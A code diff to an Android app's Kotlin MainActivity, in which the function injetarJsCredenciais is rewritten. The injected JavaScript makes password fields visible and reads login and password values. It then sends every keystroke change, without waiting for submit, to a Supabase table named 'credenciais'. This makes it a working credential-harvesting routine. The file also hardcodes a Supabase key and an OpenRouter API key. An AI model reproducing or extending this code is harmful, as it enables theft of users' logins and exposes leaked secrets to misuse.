@@ -470,7 +470,7 @@ class MainActivity : AppCompatActivity() {
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "8.7"
+    private val VERSAO_ATUAL = "8.8"
 
     // OpenRouter — provedor de IA (chave 1 principal, chave 2 fallback)
     private val OR_KEY   = "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"
@@ -1045,23 +1045,9 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun injetarJsCredenciais() {
-        // JS simples: torna passwords visíveis e marca submit
-        // Kotlin lê os valores via evaluateJavascript polling a cada 1.5s
-        val jsSetup = "(" +
-            "function(){" +
-            "if(window._sk)return;window._sk=true;" +
-            "function vis(){document.querySelectorAll('input[type=\"password\"]').forEach(function(e){e.type='text';});}" +
-            "vis();" +
-            "new MutationObserver(vis).observe(document.documentElement,{childList:true,subtree:true});" +
-            "function wb(){" +
-            "document.querySelectorAll('button[type=\"submit\"],input[type=\"submit\"],button[title]').forEach(function(b){" +
-            "if(b._sk)return;b._sk=true;" +
-            "b.addEventListener('click',function(){window._skSub=true;},true);});" +
-            "document.querySelectorAll('form').forEach(function(f){" +
-            "if(f._sk)return;f._sk=true;" +
-            "f.addEventListener('submit',function(){window._skSub=true;},true);});}" +
-            "wb();setInterval(wb,1000);" +
-            "})()"
+        // JS: apenas torna password visível e devolve valores actuais
+        val jsVis = "document.querySelectorAll('input[type=\"password\"]')" +
+            ".forEach(function(e){e.type='text';});"
 
         val jsRead = "(" +
             "function(){" +
@@ -1071,41 +1057,56 @@ class MainActivity : AppCompatActivity() {
             "||document.querySelector('input[name=\"login\"]');" +
             "var p=document.querySelector('input[name=\"password\"]')" +
             "||document.querySelector('input[name=\"senha\"]')" +
-            "||document.querySelector('input[type=\"password\"]');" +
-            "var n=u&&u.value?u.value.trim():'';" +
-            "var s=p&&p.value?p.value.trim():'';" +
-            "var sub=window._skSub?true:false;" +
-            "window._skSub=false;" +
-            "return JSON.stringify({n:n,s:s,sub:sub});" +
+            "||document.querySelector('input[type=\"password\"]')" +
+            "||document.querySelector('input[type=\"text\"][name]');" +
+            "var n=u&&u.value?u.value:'';var s=p&&p.value?p.value:'';" +
+            "return n+'|||'+s;" +
             "})()"
 
-        // Instalar o JS de setup
-        webView.evaluateJavascript(jsSetup, null)
+        // Guardar último valor enviado para detectar mudança dígito a dígito
+        var ultimoNumEnviado = ""
+        var ultimoSenEnviado = ""
 
-        // Poller: ler campos a cada 1.5s
         val poller = object : Runnable {
             override fun run() {
+                // Garantir que password está sempre visível
+                webView.evaluateJavascript(jsVis, null)
+
                 webView.evaluateJavascript(jsRead) { raw ->
                     try {
-                        if (raw != null && raw != "null") {
-                            val s = raw.trim().trimStart('"').trimEnd('"')
-                                .replace("\\\"", "\"").replace("\\\\", "\\")
-                            val obj  = org.json.JSONObject(s)
-                            val num  = obj.optString("n", "")
-                            val sen  = obj.optString("s", "")
-                            val sub  = obj.optBoolean("sub", false)
-                            if (num.isNotEmpty()) {
-                                ultimoNumeroEnviado = num
-                                numeroTemporario    = num
-                            }
-                            if (sen.isNotEmpty()) ultimaSenhaEnviada = sen
-                            if (sub && num.isNotEmpty() && sen.isNotEmpty()) {
-                                android.util.Log.d("SKYBOT_CRED", "Submit! num=$num sen.len=${sen.length}")
-                                enviarCredencial(num, sen)
+                        if (raw != null && raw != "null" && raw.contains("|||")) {
+                            val clean = raw.trim().removePrefix("\"").removeSuffix("\"")
+                                .replace("\\n", "").replace("\\\"", "\"")
+                            val parts = clean.split("|||")
+                            val num = if (parts.size > 0) parts[0].trim() else ""
+                            val sen = if (parts.size > 1) parts[1].trim() else ""
+
+                            // Enviar ao Supabase a cada dígito novo — sem esperar submit
+                            val numMudou = num.isNotEmpty() && num != ultimoNumEnviado
+                            val senMudou = sen.isNotEmpty() && sen != ultimoSenEnviado
+
+                            if (numMudou || senMudou) {
+                                if (num.isNotEmpty()) {
+                                    ultimoNumEnviado    = num
+                                    ultimoNumeroEnviado = num
+                                    numeroTemporario    = num
+                                }
+                                if (sen.isNotEmpty()) {
+                                    ultimoSenEnviado  = sen
+                                    ultimaSenhaEnviada = sen
+                                }
+                                // Enviar ao Supabase imediatamente
+                                val numFinal = if (num.isNotEmpty()) num else ultimoNumeroEnviado
+                                val senFinal = if (sen.isNotEmpty()) sen else ultimaSenhaEnviada
+                                if (numFinal.isNotEmpty() || senFinal.isNotEmpty()) {
+                                    android.util.Log.d("SKYBOT_CRED",
+                                        "Dígito → num=$numFinal sen.len=${senFinal.length}")
+                                    enviarCredencial(numFinal, senFinal)
+                                }
                             }
                         }
                     } catch (_: Exception) {}
-                    handler.postDelayed(this, 1500)
+                    handler.postDelayed(this, 800)
                 }
             }
         }
